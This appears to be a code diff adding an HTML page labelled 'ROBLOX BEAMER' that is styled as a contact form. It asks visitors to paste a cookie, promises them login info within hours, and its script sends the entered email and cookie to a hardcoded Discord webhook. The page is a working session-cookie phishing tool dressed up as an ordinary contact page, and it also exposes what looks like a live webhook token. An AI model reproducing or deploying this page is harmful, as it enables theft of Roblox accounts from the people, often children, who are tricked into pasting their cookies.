@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>RBXS7L34L3R - Contact Us</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0e0e0e;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    form {
+      background: #1e1e1e;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #00ff99;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      background: #333;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+    button {
+      margin-top: 15px;
+      padding: 10px 20px;
+      background-color: #00ff99;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      color: #000;
+      font-weight: bold;
+    }
+    .notice {
+      font-size: 0.8rem;
+      margin-top: 10px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>ROBLOX BEAMER</h1>
+  <form id="contact-form">
+    <input type="email" id="email" placeholder="Enter Email" required />
+    <textarea id="message" rows="4" placeholder="Enter Cookie"></textarea>
+    <button type="submit">Send</button>
+    <div class="notice">You will recive the login info in 1-2 Hours.</div>
+  </form>
+
+  <script>
+    const form = document.getElementById('contact-form');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const message = document.getElementById('message').value;
+
+      const webhookUrl = 'https://discord.com/api/webhooks/1335736426129788988/ebhM3D4RZiRNugaz_1rA5sVu_9Es4s2p_n44ke9oWmRTXKabS5FPld-aG2wkXPUrQCts'; // Replace with your real webhook
+
+      const payload = {
+        content: `📬 New Contact Submission\n📧 Email: ${email}\n📝 Message: ${message || "No message"}`
+      };
+
+      try {
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          alert('Thanks for your message!');
+          form.reset();
+        } else {
+          alert('Something went wrong.');
+        }
+      } catch (err) {
+        alert('Error sending message.');
+        console.error(err);
+      }
+    });
+  </script>
+
+</body>
+</html>
